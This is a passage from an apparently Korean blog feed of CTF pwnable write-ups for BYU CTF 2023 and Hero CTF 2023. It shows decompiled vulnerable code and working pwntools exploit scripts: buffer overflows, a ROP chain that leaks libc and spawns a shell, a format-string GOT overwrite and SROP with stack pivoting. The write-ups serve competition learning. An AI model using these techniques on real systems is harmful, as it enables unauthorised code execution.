class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Filename: %s&quot;</span>, fs.contents + (file_to_read*<span class="number">288</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Contents: %s&quot;</span>, fs.contents + (file_to_read*<span class="number">288</span>) + <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filesystem struct를 보면 입력 뒤에 flag가 저장되어 있다. 1번 기능으로 <code>fs.contents</code>를 채울 수 있다. 4번 기능은 나의 입력을 출력해준다. 만약 <code>fs.contents</code>를 꽉 채우면 바로 뒤에 있는 <code>fs.flag</code>가 출력될 것이다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vfs1&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./vfs1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span></span><br><span class="line">contents = <span class="string">b&#x27;b&#x27;</span> * <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, filename)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, contents)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> printf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - 2038</title>
      <link href="/230523-byuctf2023-2038/"/>
      <url>/230523-byuctf2023-2038/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>I know you really want the flag, so I’ll print it out for you, but only after January 1st, 2024 :)<br>nc byuctf.xyz 40007<br>tag: easy</p></blockquote><ul><li>[215 solves &#x2F; 100 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, nptr);</span><br><span class="line">v6 = atoi(nptr);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v6 &gt; <span class="number">1704067199</span> )</span><br><span class="line">&#123;</span><br><span class="line">  timer = v6;</span><br><span class="line">  v4 = ctime(&amp;timer);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSpecified datetime - %s\n&quot;</span>, v4);</span><br><span class="line">  v8 = time(<span class="number">0LL</span>);</span><br><span class="line">  v5 = ctime(&amp;v8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Current datetime - %s\n&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">if</span> ( timer &gt;= v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;print_flag&#x27; was not run because specified date has not occurred yet. Exiting...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Time requirement has been met. Running &#x27;print_flag&#x27;...&quot;</span>);</span><br><span class="line">    print_flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>사실 자세히 안보고 바로 풀었다. 입력값이 1704067199보다 크면 if문에 들어가길래 먼저 이걸 목표로 저거보다 큰 수를 주었다. 그랬더니 운 좋게도 <code>print_flag</code> 함수가 실행되었다. ㅎ</p><p>참고로 time함수에 널값을 넣게 되면 1970년 1월 1일 0시 이후부터 현제까지의 시간이 초로 변환된 값이 반환된다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./2038&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./2038&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">21704067199</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - frorg</title>
      <link href="/230523-byuctf2023-frorg/"/>
      <url>/230523-byuctf2023-frorg/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>I love arnimals like frorggies and crarbs and octurpurse<br>nc byuctf.xyz 40015<br>tag: hard </p></blockquote><ul><li>[45 solves &#x2F; 463 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>이 문제는 소스 코드가 주어져 있지 않아서 IDA로 바이너리 분석해야 한다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I love frorggies so much! So much I made this application to store all the frorgie names you want&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many frorgies you want to store? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4[<span class="number">0</span>]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter frorgy name: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;v4[<span class="number">1</span>] + <span class="number">10</span> * i, <span class="number">0xA</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>main 자체는 간단하다. 명백하게 bof가 발생하는데 이 bof를 몇 번 일으킬지 내가 지정할 수 있다. 문제는 10글자씩 입력할 수 있어서 원하는 주소를 입력할 때 패딩을 잘 주면서 해야 한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">___(*6)___ _x_    | __(&amp;4)__ __(*4)__</span><br><span class="line">_(^2)_ ___(&amp;6)___ | ____(^8)____</span><br><span class="line">____(%8)____      | ___x___ _(%2)_</span><br></pre></td></tr></table></figure><p>*, &amp;, ^, % 순서로 값을 준다고 생각하면 된다.</p><p>두 번째 메인에서는 <code>/bin/sh</code> 문자열 위치를 &amp;번째에 넣고 싶었는데 libc 주소는 6바이트로 끝나지 않아서 ^번째에 넣어야 했다. 그래서 <code>pop rdi</code> 전에 <code>ret</code>을 넣어줘서 <code>/bin/sh</code> 문자열 위치를 ^번째에 주는 것에 성공했다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./frorgp&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./frorgp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011e5</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">paylaod</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, paylaod)</span><br><span class="line">    info(<span class="string">&quot;send&quot;</span>)</span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">0x5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">name(p32(pop_rdi).rjust(<span class="number">0xa</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">name(p32(<span class="number">0x0</span>) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>]).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 00 00 40 ?? ??</span></span><br><span class="line">name(<span class="string">b&#x27;\x00\x00&#x27;</span> + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">name(p64(e.symbols[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc leak</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc.address = libc_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccond main</span></span><br><span class="line"><span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">0x5</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">name(p32(ret).rjust(<span class="number">0xa</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># ret</span></span><br><span class="line">name(p32(<span class="number">0x0</span>) + p32(pop_rdi).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 00 00 40 ?? ??</span></span><br><span class="line">name(<span class="string">b&#x27;\x00\x00&#x27;</span> + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))))</span><br><span class="line">name(p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(pop_rdi).ljust(6, b&#x27;\x00&#x27;)</span><br><span class="line">00 00 40 ?? ??</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 review</title>
      <link href="/230518-heroctf2023-0review/"/>
      <url>/230518-heroctf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><img src="/images/230518-heroctf2023-0review/Screenshot 2023-05-18 at 15.17.19.png" width=450/><br><p>재밌는 문제가 많았다. 난이도는 생각보다 어려웠던 것 같다. easy 2 문제, medium 1, hard 2 문제 였는데,.. Unknown 문제는 풀다가 결국 못풀었다. syscall 문제인데, 가젯들이 너무 까다로울 뿐만이 아니라 rax 레지스터를 조절하기가 매우 어려웠다. 거기다가 가젯은 익숙하지도 않은 xmm 레지스터로 처음 보는 명령어를 이용하여 놀고 있어서 롸업을 봐도 이해가 잘 안됐다. ㅎㅎ; 마지막 문제는 tcache를 이용한 heap 문제라서 보지 않았다.</p><p>내가 푼 문제들 중에서 easy 두 문제는 괜찮았고, medium 문제는 생각보다 어려웠다. 요즘 syscall을 이용하는 문제가 자주 보이는데, 모든 가젯을 꼼꼼하게 보는 버릇을 들여야겠다는 생각을 하였다. 그리고 <code>execve</code>를 실행시키고 싶을 때, 인자는 어디에 저장해야하는 지도 눈치있게 생각해야겠다.</p><ul><li><a href="https://jiravvit.github.io/230518-heroctf2023-appointment-book/">https://jiravvit.github.io/230518-heroctf2023-appointment-book/</a></li><li><a href="https://jiravvit.github.io/230518-heroctf2023-impossible-v2/">https://jiravvit.github.io/230518-heroctf2023-impossible-v2/</a></li><li><a href="https://jiravvit.github.io/230518-heroctf2023-rope-dancer/">https://jiravvit.github.io/230518-heroctf2023-rope-dancer/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 - Impossible v2 (fsb)</title>
      <link href="/230518-heroctf2023-impossible-v2/"/>
      <url>/230518-heroctf2023-impossible-v2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><blockquote><p>Your colleague trolls you again by giving you an impossible challenge, betting $200 that, this time, you won’t succeed. Show him that this impossible challenge is in fact easy!<br>Host : nc static-03.heroctf.fr 5001<br>Format : Hero{flag}<br>Author : SoEasY<br>easy</p></blockquote><ul><li>[41 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>아래처럼 <code>fsb</code>가 발생한다. (<code>buf</code>가 우리의 입력값이다.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(message, buf);</span><br></pre></td></tr></table></figure><p><code>message</code>를 출력해주는 기능이 없기 때문에 뭔가 leak할수가 없다. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += <span class="string">b&#x27;_%p&#x27;</span> * <span class="number">8</span></span><br></pre></td></tr></table></figure><p>위 paylaod로 입력을 보내고 디버거 상으로 <code>message</code>를 확인하면 아래와 같이 offset이 7임을 확인할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/s 0x000000004040e0</span><br><span class="line">0x4040e0 &lt;message&gt;:     &quot;aaaaaaaa_0x21_0x7f30b4e66931_0x14278b1_(nil)_(nil)_0x14276b0_0x6161616161616161_0x255f70255f70255f\n&quot;</span><br></pre></td></tr></table></figure><p><code>fsb</code>가 발생한 후, <code>if (!memcmp(message, expected, 0x10uLL))</code>가 참이면 <code>flag.txt</code>를 출력해준다.</p><p><code>pie</code>도 안걸려있으니 <code>memcmp@got</code>에 <code>flag.txt</code>가 출력되는 주소를 덮어줬다. 길이가 충분하지 않으니 2바이트만 덮어주었다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./impossible_v2&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./impossible_v2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 7</span></span><br><span class="line"><span class="comment"># payload = b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># payload += b&#x27;a&#x27; * 8</span></span><br><span class="line"><span class="comment"># payload += b&#x27;_%p&#x27; * 8</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;e.got[<span class="string">&#x27;memcmp&#x27;</span>] : p16(<span class="number">0x14B7</span>)&#125;)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;e:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># der $_got()</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - stack pivoting</title>
      <link href="/230518-pwn-stack-pitvoting/"/>
      <url>/230518-pwn-stack-pitvoting/</url>
      
        <content type="html"><![CDATA[<ol><li>rbp를 jump하고 싶은 주소 -8로 세팅 (rop 가젯이 있는 곳 - 8)</li><li>ret를 leave_ret주소로 변경</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * dummy</span><br><span class="line">payload += p64(rop_payload - <span class="number">8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 - Rope Dancer (srop, stack pivoting)</title>
      <link href="/230518-heroctf2023-rope-dancer/"/>
      <url>/230518-heroctf2023-rope-dancer/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><blockquote><p>A circus has just opened near you and you would love to work there as a rope dancer. Perhaps you could access their recruitment criteria to maximize your chances of being selected?<br>Host : nc static-03.heroctf.fr 5002<br>Format : Hero{flag}<br>Author : SoEasY<br>medium</p></blockquote><ul><li>[31 solves &#x2F; 460 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">sys_read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">sys_read(<span class="number">0</span>, motivation_letter, <span class="number">0x1F4</span>uLL);</span><br></pre></td></tr></table></figure><p>처음에 <code>buf</code>에 입력을 받고 전역 변수인 <code>motivation_letter</code> 에도 매우 넉넉하게 입력을 받는다. 보호기법이 아무것도 걸려있지 않기 때문에 단순하게 생각해야한다.</p><p><code>pie</code>가 걸려있지 않아서 전역 변수 주소를 바로 알 수 있고, 값을 적은 곳의 주소를 계산할 수 있다. (오프셋을 계산할 수 있다.)</p><p>처음에 <code>buf</code>에 입력을 받을 때 명백한 <code>bof</code>가 발생한다. 하지만 길이가 짧기 때문에 어딘가에 <code>payload</code>를 저장하고 그 곳으로 뛸 생각을 1차적으로 해야한다.</p><p><code>motivation_letter</code>에 입력받는 사이즈가 크기 때문에 적절해보였다. 여기에 <code>rop_payload</code>를 저장하고 뛰어야겠다. 그리고 <code>execve</code> 함수 인자 <code>/bin/sh</code>를 저장해야겠다.</p><p><code>sigreturn rop</code>를 할 때 가장 주의해야 할 점은 <code>rax</code> 레지스터의 크기를 잊지 않고 <code>0xf</code>로 맞춰주고 <code>syscall ; ret</code>를 실행해야한다는 것이다.</p><p><code>stack pivoting</code>할 때 가젯 덩어리들 보면서 단순하게 <code>leave ; ret</code>이 안보여서 당황할 수도 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401114                 mov     rsp, rbp</span><br><span class="line">.text:0000000000401117                 pop     rbp</span><br><span class="line">.text:0000000000401118                 retn</span><br></pre></td></tr></table></figure><p>이 문제는 어셈블리로 쓰여졌기 때문에 위 어셈블리가 <code>leave ; ret</code>임을 눈치채야 한다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>stack pivoting 하는 법</p><ol><li>rbp를 jump하고 싶은 주소 -8로 세팅 (rop 가젯이 있는 곳 - 8)</li><li>ret를 leave_ret주소로 변경</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./ropedancer&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ropedancer&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span 